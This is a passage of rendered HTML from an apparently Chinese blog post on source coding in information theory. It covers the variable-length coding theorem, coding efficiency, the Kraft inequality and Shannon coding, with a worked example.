style="height:3em;"></span><span class="mord"><span class="mord mathnormal">L</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">ε</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ε</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></span></p><p>其中，又定义的<strong>编码效率</strong>：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>η</mi><mo>=</mo><mfrac><mrow><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo fence="true">)</mo></mrow></mrow><mi>R</mi></mfrac></mrow><annotation encoding="application/x-tex">\eta =\frac{H\left( X \right)}{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">η</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p><strong>变长编码定理</strong>则告诉，<strong>如果编码的平均长度满足下面的条件，那么一定存在无失真编码，而且信息率 R 大于信源熵</strong>：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>1</mn><mo>+</mo><mfrac><mrow><mi>L</mi><mo>×</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><mrow><mi>log</mi><mo>⁡</mo><mi>m</mi></mrow></mfrac><mo>≥</mo><mover accent="true"><mi>K</mi><mo stretchy="true">‾</mo></mover><mo>≥</mo><mfrac><mrow><mi>L</mi><mo>×</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><mrow><mi>log</mi><mo>⁡</mo><mi>m</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">1+\frac{L\times H(X)}{\log m}\ge \overline{K}\ge \frac{L\times H(X)}{\log m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.3074em;vertical-align:-0.8804em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0193em;vertical-align:-0.136em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span><span style="top:-3.8033em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3074em;vertical-align:-0.8804em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>在变长编码定理的框架内，还需要一种系统的编码的方式，确保在变长的码字不会产生歧义，而且接收序列时可以立即匹配编码，不用观察后面的码字。</p><img src="https://cdn.blog-blockchain.xyz/202305222216784.png" alt="image-20230522221626556" style="zoom:67%;" /><p>根据<strong>克拉夫特不等式</strong>，能够找到这样的<strong>异前置码</strong>编码方式的充要条件是，对于 m 个字符的编码系统，信源 X 的每个字符映射后的字符长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">k_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，满足：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msup><mi>m</mi><mrow><mo>−</mo><msub><mi>k</mi><mi>i</mi></msub></mrow></msup><mo>≤</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\sum_{i=1}^n{m^{-k_i}}\le 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></span></p><h2 id="香农编码">香农编码</h2><p>香农编码就是这样变长编码的一种方式。按信源符号的概率<strong>从大到小</strong>的顺序排队，然后对每个字符定义累加概率（排在它前面的字符的概率之和），这样就可以得到结论：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="center" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><msub><mi>p</mi><mi>a</mi></msub><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><msub><mi>p</mi><mi>a</mi></msub><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>j</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mo>−</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo>≤</mo><msub><mi>k</mi><mi>i</mi></msub><mo>≤</mo><mn>1</mn><mo>−</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{gather*}&amp;p_a(0)=0\\&amp;p_a\left(a_j\right)=\sum_{i=1}^{j-1} p\left(a_i\right), j=1,2, \cdots, n\\&amp;-\log _2 p\left(a_i\right) \leq k_i \leq 1-\log _2 p\left(a_i\right)\end{gather*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6.4364em;vertical-align:-2.9682em;"></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.4682em;"><span style="top:-6.487em;"><span class="pstrut" style="height:3.8588em;"></span><span class="mord"></span></span><span style="top:-3.9682em;"><span class="pstrut" style="height:3.8588em;"></span><span class="mord"></span></span><span style="top:-1.5506em;"><span class="pstrut" style="height:3.8588em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.9682em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.4682em;"><span style="top:-6.487em;"><span class="pstrut" style="height:3.8588em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span><span style="top:-3.9682em;"><span class="pstrut" style="height:3.8588em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8588em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3471em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-1.5506em;"><span class="pstrut" style="height:3.8588em;"></span><span class="mord"><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.9682em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>编码则是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>a</mi></msub><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">p_a\left(a_j\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span> 二进制表示的小数点后 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">k_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 位。参考下面的例题。</p><img src="https://cdn.blog-blockchain.xyz/202305222237650.png" alt="image-20230522223728529" style="zoom: 40%;" /><p>可以计算得到相关参数：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>L</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mtext> </mtext><mi>m</mi><mo>=</mo><mn>2</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mn>2.4233</mn><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">b</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">t</mi></mrow><mi mathvariant="normal">/</mi><mrow><mi mathvariant="normal">s</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">g</mi><mi mathvariant="normal">n</mi></mrow><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mover accent="true"><mi>K</mi><mo stretchy="true">‾</mo></mover><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mn>6</mn></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mi>k</mi><mi>i</mi></msub><mo>=</mo><mn>2.7</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>R</mi><mo>=</mo><mfrac><mover accent="true"><mi>K</mi><mo stretchy="true">‾</mo></mover><mi>L</mi></mfrac><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>m</mi><mo>=</mo><mn>2.7</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>η</mi><mo>=</mo><mfrac><mrow><mi>H</mi><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">X</mi><mo stretchy="false">)</mo></mrow></mrow><mi>R</mi></mfrac><mo>=</mo><mn>89.63</mn><mi mathvariant="normal">%</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*}&amp;L=1,\ m=2 \\&amp;H(X)=2.4233( \mathrm{bit} / \mathrm{sign} )\\&amp;\overline{K}=\sum_{i=1}^6{p}\left( a_i \right) k_i=2.7\\&amp;R=\frac{\overline{K}}{L}\log _2m=2.7\\&amp;\eta =\frac{H(\mathrm{X)}}{R}=89.63\%\end{align*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:11.3381em;vertical-align:-5.4191em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9191em;"><span style="top:-8.8802em;"><span class="pstrut" style="height:3.8011em;"></span><span class="mord"></span></span><span style="top:-7.3802em;"><span class="pstrut" style="height:3.8011em;"></span><span class="mord"></span></span><span style="top:-4.9191em;"><span class="pstrut" style="height:3.8011em;"></span><span class="mord"></span></span><span style="top:-1.7811em;"><span class="pstrut" style="height:3.8011em;"></span><span class="mord"></span></span><span style="top:0.6319em;"><span class="pstrut" style="height:3.8011em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4191em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9191em;"><span style="top:-8.8802em;"><span class="pstrut" style="height:3.8011em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal">L</span><span class="mspace" 